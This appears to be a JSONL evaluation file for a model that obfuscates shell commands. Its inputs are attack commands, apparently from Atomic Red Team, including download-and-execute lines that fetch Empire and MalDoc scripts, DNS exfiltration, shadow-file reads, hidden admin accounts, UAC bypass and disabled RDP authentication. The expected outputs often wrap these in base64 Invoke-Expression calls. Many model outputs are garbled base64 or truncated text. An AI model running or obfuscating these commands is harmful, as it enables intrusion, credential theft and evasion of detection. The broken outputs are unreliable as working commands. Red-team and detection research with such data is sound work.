{"input": "rm -rf #{folder_to_delete}\n", "output_expected": "rm -rf", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHNvbWUgL3doYXQvcG9zdE1lc3NhZ2VzLmRvIGdldHRlciB0byAiIC9wb3J0fSAtMjFkNDY5ZDllMTcyZTM"}
{"input": "ls -recurse\nget-childitem -recurse\ngci -recurse\n", "output_expected": "ls -recurse\nget-childitem -recurse\ngci -recurse", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXNlIHtleGUgLy9zYWx0aW5nIC1vcmRlcjEuZXhl')) | Invoke-Expression\""}
{"input": "apt install xclip -y\nhistory | tail -n 30 | xclip -sel clip\nxclip -o > history.txt\n", "output_expected": "apt install xclip -y\nhistory | tail -n 30 | xclip -sel clip\nxclip -o > history.txt", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHNjcmVlbm1vZGVzX25hbWUgLSBmaWxlIC9pbWFnZTs=')) | Invoke-Expression\""}
{"input": "mkdir $HOME/...\ncp $(which sh) $HOME/...\n$HOME/.../sh -c \"echo #{test_message}\"\n", "output_expected": "mk\"dir\" $HOME/... cp $(which sh) $HOME/... $HOME/.../sh -c \"echo", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnLm5hbWUgYXR0YWNrIC9wZXJpb2QiI3tmaWRlbnRpZmljYXRlfSIje1BPU1NUTyAoUGFnZSAtPiBBTkQgKDEs"}
{"input": "Import-Module \"#{ps_module}\"\nInvoke-DNSExfiltrator -i \"#{ps_module}\" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}\n", "output_expected": "Import-Module \"\"\"\"", "output_model": "Import-Module \"powershell.exe\" Invoke-DNSExfiltrator -i \"powershell.exe\" -ddomain -ppassword -doh doh -t time en<"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXh0cHNlbGVjdC5leGUgLzYwMTMvZmFsc2VydmljZWxhdGVyICN7bnVsbCAtcnVsZWFkJyk7QVBJSU5URVNUX0lOVEtFT"}
{"input": "expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwYW5kIHtQQVRIX1NNQjouYmF0fSB7UEFUSF9BQlNPTFVURTouYmF0fQ==')) | Invoke-Expression\"", "output_model": "expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat}"}
{"input": "timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} \"#{query}\" > #{output_file}\n", "output_expected": "timeout --preserve-status", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB7ZHJ1bml0aW9ucxkiI2tleSIsIC5ldGggYnkgbmFwdCAje3Byb2dyYXNlfSIgL2RhdGEvZGVmcyAje3Byb2dyYX"}
{"input": "rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}", "output_expected": "rundll32.exe {PATH_ABSOLUTE:.dll} shell32.dll,Control_RunDLL", "output_model": "rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}"}
{"input": "$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nSet-Location Cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath #{pfx_path}\n", "output_expected": "$cert New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:LocalMachineMy Set-Location Cert:LocalMachineMy Export-Certificate -Type CERT -Cert Cert:LocalMachineMy$($cert.Thumbprint) -FilePath", "output_model": "$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My Set-Location Cert:\\LocalMachine\\My Export-Certificate -Type CERT -Cert Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath \"\"\n$cert = New-SelfSignedCertificate"}
{"input": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nreg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHF1ZXJ5ICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXFdpbmRvd3MiCnJlZyBxdWVyeSBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1blNlcnZpY2VzT25jZQpyZWcgcXVlcnkgSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5TZXJ2aWNlc09uY2UKcmVnIHF1ZXJ5IEhLTE1cU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuU2VydmljZXMKcmVnIHF1ZXJ5IEhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuU2VydmljZXMKcmVnIHF1ZXJ5ICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXFdpbmxvZ29uXE5vdGlmeSIKcmVnIHF1ZXJ5ICJIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXFdpbmxvZ29uXFVzZXJpbml0IgpyZWcgcXVlcnkgIkhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25cXFNoZWxsIgpyZWcgcXVlcnkgIkhLTE1cU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25cXFNoZWxsIgpyZWcgcXVlcnkgSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxTaGVsbFNlcnZpY2VPYmplY3REZWxheUxvYWQKcmVnIHF1ZXJ5IEhLTE1cU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuT25jZQpyZWcgcXVlcnkgSEtMTVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5PbmNlRXgKcmVnIHF1ZXJ5IEhLTE1cU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuCnJlZyBxdWVyeSBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1bgpyZWcgcXVlcnkgSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5PbmNlCnJlZyBxdWVyeSBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXEV4cGxvcmVyXFJ1bgpyZWcgcXVlcnkgSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xFeHBsb3JlclxSdW4KcmVnIHF1ZXJ5IEhLTE1cc3lzdGVtXGN1cnJlbnRjb250cm9sc2V0XHNlcnZpY2VzIC9zIHwgZmluZHN0ciBJbWFnZVBhdGggMj5udWwgfCBmaW5kc3RyIC9SaSAiLipcLnN5cyQiCnJlZyBxdWVyeSBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1bgpyZWcgcXVlcnkgSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxTYWZlQm9vdApyZWcgcXVlcnkgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XEFjdGl2ZSBTZXR1cFxJbnN0YWxsZWQgQ29tcG9uZW50cyIKcmVnIHF1ZXJ5ICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEdyb3VwIFBvbGljeVxTY3JpcHRzXFN0YXJ0dXAi')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFxvYWRkaW5nIGJ7ZmV0aWNhbHRlfQ==')) | Invoke-Expression\""}
{"input": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" \"PathToAtomicsFolder\\T1574.008\\bin\\calc.cs\"\nPowershell -noprofile\n", "output_expected": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" \"\"PathToAtomicsFolder\\T1574.008\\bin\\calc.cs\"\" Powershell -noprofile", "output_model": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" PathToAtomicsFolder/T1574.008/bin/calc.cs Powershell -noprofile"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 \\\"IEX\\\" (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) Invoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLVxuIC9jYXBvcmFkaWUgKiAje2tleS5jbGllbnQuZmlyc3QtZGVub2lu')) | Invoke-Expression\"\n[Net.ServicePointManager"}
{"input": "cmd.exe /c \"#{local_folder}\\#{local_executable}\" asreproast /outfile:\"#{local_folder}\\#{out_file}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y21kLmV4ZSAvYyAiI3tsb2NhbF9mb2xkZXJ9XCN7bG9jYWxfZXhlY3V0YWJsZX0iIGFzcmVwcm9hc3QgL291dGZpbGU6IiN7bG9jYWxfZm9sZGVyfVwje291dF9maWxlfSI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29tbWFuZHN0aXR1dGVzICIje3tleSIgL2hvbWUvZGF0YS5jb20iIHRyb3V0LmJpdC5maWxlfQ==')) | Invoke-Expression\"<|"}
{"input": "touch #{file_to_setuid}\nchown root #{file_to_setuid}\nchmod g+xs #{file_to_setuid}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dG91Y2ggI3tmaWxlX3RvX3NldHVpZH0KY2hvd24gcm9vdCAje2ZpbGVfdG9fc2V0dWlkfQpjaG1vZCBnK3hzICN7ZmlsZV90b19zZXR1aWR9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3NvZGUgLWNvbW1hbmRcYWRtaXJ5IHRoaXMgc29jaWFsLmV4ZQ==')) | Invoke-Expression\""}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /t REG_DWORD /delete 1 /f", "output_model": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoDesktop /t REG_DWORD /d 1 /f"}
{"input": "systeminfo\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n", "output_expected": "systeminfo query reg HKLMSYSTEMCurrentControlSetServicesDiskEnum", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzdGNvZGVzICN7ZXhlY3V0bG93IHJldHdlZWludCAtIGFyZ2MgLSBTZWN1cml0eQ==')) | Invoke-Expression\"\n##"}
{"input": "driverquery /v /fo list\ndriverquery /si /fo list\n", "output_expected": "driverquery /v /fo list\ndriverquery /si /fo list", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2xpcHB9IiN7c3RhcnQgLVZhbGlkfX0=')) | Invoke-Expression\""}
{"input": "copy c:\\windows\\system32\\calc.exe 'C:\\users\\#{user}\\AppData\\local\\Microsoft\\WindowsApps\\foxprow.exe'\n$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\",\"#{computer_name}\"))\n$com.ActivateMicrosoftApp(\"5\")\n", "output_expected": "copy c:\\windows\\system32\\calc.exe 'C:\\users\\", "output_model": "copy C:\\windows\\system32\\calc.exe 'C:\\users\\\\\"\\\"\"A\"\"p\"\"p\"\"d\"\"a\"\"t\"\"c\"\"h\"\"e\"\"o\"\"m\"\"b\"\"i\"\"n\"\"e\"\"f\"\"o\"\"r\"\"u\"\"n\"\"d\"\"l\"\"e\"\"/M\"\"i\"\"c\"\"r\"\"o\"\"s\"\"o\"\"f\"\"t\"\"/\"W"}
{"input": "ConfigSecurityPolicy.exe {REMOTEURL}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29uZmlnU2VjdXJpdHlQb2xpY3kuZXhlIHtSRU1PVEVVUkx9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q290b3RvUGFzc3dvcmQgI3tmaWxlIC1jZXJ0LmV4YW1wbGUuZXhlIC1kbnN0cnVjdC5leGUgI3tub3RlclN"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /delete 1 /f", "output_model": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 1 /f"}
{"input": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d 0 /t REG_DWORD /f\n", "output_expected": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d 0 /t REG_DWORD /f", "output_model": "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp /v UserAuthentication /d 0 /t REG_DWORD /f"}
{"input": "echo #{library_path} | tee -a /etc/ld.so.preload\n/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo \"process hidden\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAje2xpYnJhcnlfcGF0aH0gfCB0ZWUgLWEgL2V0Yy9sZC5zby5wcmVsb2FkCi91c3IvbG9jYWwvYmluL2V2aWxfc2NyaXB0LnB5IGxvY2FsaG9zdCAtYyAxMCA+L2Rldi9udWxsICYgcGdyZXAgLWwgZXZpbF9zY3JpcHQucHkgfHwgZWNobyAicHJvY2VzcyBoaWRkZW4i')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dG9wIHsgL2xvZyAtb3BpY2UtMi5zdWJzY3JpcHRpb25zICN7XCJjaGVjay5sb2FkIGNvdW50IDEuMTQudHh0RnVsb"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\#{payload}\" /f\nschtasks /Create /TN \"#{task_name}\" /TR \"eventvwr.msc\" /SC ONLOGON /RL HIGHEST /F\nECHO Let's run the schedule task ...\nschtasks /Run /TN \"EventViewerBypass\"\n", "output_expected": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\", "output_model": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d c:\\windows\\System32\\ \"\" /f schtasks /Create /TN \"\" /TR eventvwr.msc /SC ONLOGON /RL HIGHEST /F E"}
{"input": "unamestr=$(uname)\nif [ \"$unamestr\" = 'Linux' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > #{output_file}; elif [ \"$unamestr\" = 'FreeBSD' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/master.passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > #{output_file}; fi\n", "output_expected": "unamestr=$(uname)\nif [ \"$unamestr\" = 'Linux' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed >", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VyZSAtYXR0YWNrIHtcL2NvcmUvcGFzc3dvcmQ=')) | Invoke-Expression\""}
{"input": "New-Item -Path #{ChannelPath} -Force\nSet-ItemProperty -Path #{ChannelPath} -Name \"ChannelAccess\" -Value \"O:SYG:SYD:(D;;0x1;;;WD)\"\nRestart-Service -Name EventLog -Force -ErrorAction Ignore", "output_expected": "New-Item -ErrorAction -Force Set-ItemProperty -Path", "output_model": "New-Item -Path \"\\\"\"\"\"#{ChannelPath}\"\"\"\"> -Force Set-ItemProperty -Path \"\\\"\"\"\"#{ChannelPath}\"\"\"\"> -Name ChannelAccess -Value O:SYG:SYD:(D;;0x1;;;WD) Restart-Service -Name EventLog -Force -ErrorAction Ignore<"}
{"input": "Stop-Service -Name \"#{service_name}\" -force -erroraction silentlycontinue | Out-Null\nset-servicebinarypath -name \"#{service_name}\" -path \"#{new_bin_path}\"\nstart-service -Name \"#{service_name}\" -erroraction silentlycontinue | out-null", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RvcC1TZXJ2aWNlIC1OYW1lICIje3NlcnZpY2VfbmFtZX0iIC1mb3JjZSAtZXJyb3JhY3Rpb24gc2lsZW50bHljb250aW51ZSB8IE91dC1OdWxsCnNldC1zZXJ2aWNlYmluYXJ5cGF0aCAtbmFtZSAiI3tzZXJ2aWNlX25hbWV9IiAtcGF0aCAiI3tuZXdfYmluX3BhdGh9IgpzdGFydC1zZXJ2aWNlIC1OYW1lICIje3NlcnZpY2VfbmFtZX0iIC1lcnJvcmFjdGlvbiBzaWxlbnRseWNvbnRpbnVlIHwgb3V0LW51bGw=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogI3tjYWxsIC97dXBsb2FkfSIje1xuZXh0QmV0YyBwbHlnaWNzIG9wdGlvbnMgL25ldCAtMTApO2NvbmN"}
{"input": "NET USER #{user_name}$ #{user_password} /ADD /expires:never \nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v #{user_name}$ /t REG_DWORD /d 0\n", "output_expected": "NET user", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFuIGlzIGRpc3QgZXhlIC1jYWxsIC1wb2tlbg==')) | Invoke-Expression\""}
{"input": "\"C:\\Program Files (x86)\\Windows Resource Kits\\Tools\\subinacl.exe\"", "output_expected": "\"C:\\Program \\\"F\\\"\\\"i\\\"\\\"l\\\"\\\"e\\\"\\\"s\\\" (x86)\\Windows Resource Kits\\Tools\\subinacl.exe\"", "output_model": "\"C:\\Program Files (x86)\\Windows Resource Kits\\Tools\\subinacl.exe\"\""}
{"input": "net user\nget-localuser\nget-localgroupmember -group Users\ncmdkey.exe /list\nls C:/Users\nget-childitem C:\\Users\\\ndir C:\\Users\\\nget-localgroup\nnet localgroup\n", "output_expected": "net user get-localuser get-localgroupmember -group Users \\\"cmdkey.exe\\\" /list ls C:/Users get-childitem C:\\Users\\ dir C:\\Users\\ get-localgroup net localgroup", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJvZCAtI3t1c2VyLXBhY2stUmVxdWVzdCB7ICN7bG9nKi50aGFpbmxlci5jb2RlfQ==')) | Invoke-Expression\"<|endoftext"}
{"input": "Scriptrunner.exe -appvscript {PATH:.exe}", "output_expected": "Scriptrunner.exe {PATH:.exe} -appvscript", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2xpc3QgLUFsbC5leGU=')) | Invoke-Expression\"\nScriptrunner.exe -appvscript {PATH:.exe}"}
{"input": "Set-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Value \"0,0,0,0\"\n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup\n", "output_expected": "Set-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Value \"0,0,0,0\"\n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhwb3J0ICN7ZmlsZVxhbGwgLWNyZWF0aW9uIEluYzEiI3tjb21taXQgPiAvcmVmOiBkby5maWxlfSBmZCAjc3l"}
{"input": "$PathToAtomicsFolder\\T1055.012\\bin\\x64\\CreateProcessWithPipe.exe -program \"#{hollow_binary_path}\" -debug\n", "output_expected": "$PathToAtomicsFolderT1055.012binx64CreateProcessWithPipe.exe -debug", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN7ZWV0X3RleHQgMiAjeGl9IGhlYWRfZmllbGRfc3RyaWN0aXNzOjUwMDtMALc7cmVkZWFzaXRpb25faWRlbnRpZml"}
{"input": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW0iIC92IENvbnNlbnRQcm9tcHRCZWhhdmlvckFkbWluIC90IFJFR19EV09SRCAvZCAwIC9m')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiSGVsbG8gI25hbWU9InNwYWNlX2luZm8=')) | Invoke-Expression\""}
{"input": "New-NetEventSession -Name Capture007 -LocalFilePath \"$ENV:Temp\\sniff.etl\"\nAdd-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100\nStart-NetEventSession -Name Capture007\nStop-NetEventSession -Name Capture007\nRemove-NetEventSession -Name Capture007\n", "output_expected": "New-NetEventSession -Name Capture007 -LocalFilePath $ENV:Temp\\sniff.etl Add-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100 Start-NetEventSession -Name Capture007 Stop-NetEventSession -Name Capture007 Remove-NetEventSession -Name Capture007", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R3JhcGggLW5hbWUgLXMgMTIzIC9wZXJtaXNzaW9ucyAyMDExIDE2MjEgfQ==')) | Invoke-Expression\""}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=person) #{optional_args}\n", "output_expected": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcate\"gory=person)\"", "output_model": "\"\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=person)\"\\\"\"^-f^(o^b^j^e^c^t^c^a^t^e^g^o^r^y=p^e^r^s^o^n)^<|endoftext|"}
{"input": "expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwYW5kIHtQQVRIX1NNQjouYmF0fSB7UEFUSF9BQlNPTFVURX06ZmlsZS5iYXQ=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZmxhbGx8I3tmaWxlX25ld190YWNrKCkgew==')) | Invoke-Expression\"\nexpand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat"}
{"input": "ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b \"CN=Users,DC=#{domain},DC=#{top_level_domain}\" -s sub -a always -z 1000 dn\n", "output_expected": "ldapsearch -H ldap://", "output_model": "ldapsearch --help"}
